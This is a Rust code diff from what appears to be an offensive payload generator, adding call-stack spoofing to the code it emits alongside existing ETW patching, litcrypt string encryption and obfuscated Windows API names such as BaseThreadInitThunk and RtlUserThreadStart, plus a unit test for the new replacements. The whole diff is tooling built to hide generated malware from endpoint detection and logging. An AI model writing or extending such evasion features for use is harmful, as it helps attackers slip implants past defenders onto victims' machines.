@@ -15,6 +15,8 @@ const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
 const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
 const COMMON_MODULE_DECL: &str = "mod common;";
 const ETW_PATCH_FRAGMENT: &str = include_str!("../../templates/fragments/etw_patch.rs");
+const STACK_SPOOF_FRAGMENT: &str = include_str!("../../templates/fragments/stack_spoof.rs");
+const SPOOFED_SYSCALL_FALLBACK: &str = "macro_rules! spoofed_syscall {\n    ($function_name:expr, $($argument:expr),+) => { syscall!($function_name, $($argument),+) };\n}\n";
 
 pub(super) fn build_dependencies(template_dependencies: Option<String>) -> String {
     match template_dependencies {
@@ -117,6 +119,18 @@ fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, Str
         "{{OBF_ADD_VECTORED_EXCEPTION_HANDLER}}",
         obfuscate_api_name("AddVectoredExceptionHandler", key),
     );
+    replacements.insert(
+        "{{OBF_BASE_THREAD_INIT_THUNK}}",
+        obfuscate_api_name("BaseThreadInitThunk", key),
+    );
+    replacements.insert(
+        "{{OBF_RTL_USER_THREAD_START}}",
+        obfuscate_api_name("RtlUserThreadStart", key),
+    );
+    replacements.insert(
+        "{{OBF_IS_PROCESS_CET_ENABLED}}",
+        obfuscate_api_name("IsProcessCETEnabled", key),
+    );
 }
 
 fn add_etw_patch_replacements(replacements: &mut HashMap<&'static str, String>, enable: bool) {
@@ -130,6 +144,33 @@ fn add_etw_patch_replacements(replacements: &mut HashMap<&'static str, String>, 
 
     replacements.insert("{{ETW_PATCH_FUNCTION}}", etw_patch_function);
     replacements.insert("{{ETW_PATCH_CALL}}", "unsafe { patch_etw(); }".to_string());
+}
+
+fn add_stack_spoof_replacements(replacements: &mut HashMap<&'static str, String>, enable: bool) {
+    if !enable {
+        replacements.insert(
+            "{{STACK_SPOOF_MODULE}}",
+            SPOOFED_SYSCALL_FALLBACK.to_string(),
+        );
+        replacements.insert("{{STACK_SPOOF_INIT}}", String::new());
+        return;
+    }
+
+    let key = replacements["{{API_KEY}}"].clone();
+    let btit = replacements["{{OBF_BASE_THREAD_INIT_THUNK}}"].clone();
+    let ruts = replacements["{{OBF_RTL_USER_THREAD_START}}"].clone();
+    let cet = replacements["{{OBF_IS_PROCESS_CET_ENABLED}}"].clone();
+    let fragment = STACK_SPOOF_FRAGMENT
+        .replace("{{API_KEY}}", &key)
+        .replace("{{OBF_BASE_THREAD_INIT_THUNK}}", &btit)
+        .replace("{{OBF_RTL_USER_THREAD_START}}", &ruts)
+        .replace("{{OBF_IS_PROCESS_CET_ENABLED}}", &cet);
+
+    replacements.insert("{{STACK_SPOOF_MODULE}}", fragment);
+    replacements.insert(
+        "{{STACK_SPOOF_INIT}}",
+        "unsafe { rp_init_stack_spoof(); }".to_string(),
+    );
 }
 
 /// Build the full replacement map for a given order.
@@ -162,6 +203,7 @@ pub(super) fn build_replacements(
 
     add_api_obfuscation_replacements(&mut replacements);
     add_etw_patch_replacements(&mut replacements, order.etw_patch);
+    add_stack_spoof_replacements(&mut replacements, order.stack_spoof);
     Ok(replacements)
 }
 
@@ -228,5 +270,23 @@ mod tests {
         add_etw_patch_replacements(&mut replacements, false);
         assert!(replacements["{{ETW_PATCH_FUNCTION}}"].is_empty());
         assert!(replacements["{{ETW_PATCH_CALL}}"].is_empty());
+    }
+
+    #[test]
+    fn test_add_stack_spoof_replacements() {
+        let mut replacements = HashMap::new();
+        add_api_obfuscation_replacements(&mut replacements);
+        add_stack_spoof_replacements(&mut replacements, true);
+        let module = &replacements["{{STACK_SPOOF_MODULE}}"];
+        assert!(module.contains("rp_spoof_stub"));
+        assert!(module.contains("spoofed_syscall"));
+        assert!(!module.contains("{{API_KEY}}"));
+        assert!(!module.contains("{{OBF_"));
+        assert!(replacements["{{STACK_SPOOF_INIT}}"].contains("rp_init_stack_spoof"));
+
+        let mut replacements = HashMap::new();
+        add_stack_spoof_replacements(&mut replacements, false);
+        assert!(replacements["{{STACK_SPOOF_MODULE}}"].contains("macro_rules! spoofed_syscall"));
+        assert!(replacements["{{STACK_SPOOF_INIT}}"].is_empty());
     }
 }
